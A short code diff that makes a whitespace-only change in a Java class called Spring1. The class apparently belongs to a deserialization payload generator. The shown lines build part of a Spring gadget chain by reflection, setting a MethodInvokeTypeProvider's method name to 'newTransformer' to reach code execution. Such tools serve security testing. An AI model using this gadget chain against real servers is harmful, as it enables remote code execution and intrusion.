@@ -66,7 +66,7 @@ public class Spring1 implements ObjectPayload<Object> {
                 forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
 
         final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
-        final Object      mitp     = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[]{}), 0);
+        final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[]{}), 0);
         Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
         return mitp;
